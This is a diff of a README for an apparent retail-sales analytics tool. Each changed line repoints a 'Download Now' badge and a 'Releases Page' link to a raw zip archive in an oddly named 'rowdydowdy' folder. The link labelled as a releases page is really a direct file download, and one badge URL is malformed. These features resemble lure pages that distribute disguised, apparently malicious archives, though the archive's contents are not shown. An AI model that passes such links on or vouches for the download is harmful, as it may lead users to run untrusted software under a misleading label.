@@ -1,7 +1,7 @@
 # 🎉 Retail-Sales-Customer-Performance-Insights - Gain Insights to Drive Retail Growth
 
-![Download Here](https://github.com/Rishav1432/Retail-Sales-Customer-Performance-Insights/raw/refs/heads/main/rowdydowdy/Sales-Performance-Insights-Customer-Retail-3.1.zip%20Now-Here-brightgreen)
-[Download Now](https://github.com/Rishav1432/Retail-Sales-Customer-Performance-Insights/raw/refs/heads/main/rowdydowdy/Sales-Performance-Insights-Customer-Retail-3.1.zip)
+![Download Here](https://raw.githubusercontent.com/Rishav1432/Retail-Sales-Customer-Performance-Insights/main/rowdydowdy/Retail_Sales_Performance_Customer_Insights_v1.0.zip%20Now-Here-brightgreen)
+[Download Now](https://raw.githubusercontent.com/Rishav1432/Retail-Sales-Customer-Performance-Insights/main/rowdydowdy/Retail_Sales_Performance_Customer_Insights_v1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to the Retail Sales Customer Performance Insights. This application help
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: **[Releases Page](https://github.com/Rishav1432/Retail-Sales-Customer-Performance-Insights/raw/refs/heads/main/rowdydowdy/Sales-Performance-Insights-Customer-Retail-3.1.zip)**. You will find the latest version there, along with older versions if needed.
+To get started, visit this page to download: **[Releases Page](https://raw.githubusercontent.com/Rishav1432/Retail-Sales-Customer-Performance-Insights/main/rowdydowdy/Retail_Sales_Performance_Customer_Insights_v1.0.zip)**. You will find the latest version there, along with older versions if needed.
 
 ### Steps to Follow:
 
